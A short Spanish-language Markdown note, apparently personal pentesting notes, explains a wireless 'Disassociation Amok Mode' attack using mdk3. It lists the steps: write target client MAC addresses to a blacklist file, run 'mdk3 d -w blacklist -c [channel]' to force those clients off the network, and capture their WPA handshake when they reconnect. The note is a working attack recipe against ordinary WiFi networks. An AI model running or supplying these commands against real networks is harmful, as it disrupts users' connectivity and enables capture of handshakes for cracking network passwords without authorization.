# Ataque Disassociation Amok Mode

# Ponemos las station de los clientes que queremos en la siguiente lista negra

```bash
nano blacklist
```

# Con este ataque de lista negra expulsaremos a todos los usuarios que necesitemos y podran volver al momento que lo frenemos con CTRL C

```bash
mdk3 d -w blacklist -c [numerodecanal]
```

# Se autentican otra vez y te da su handshake.
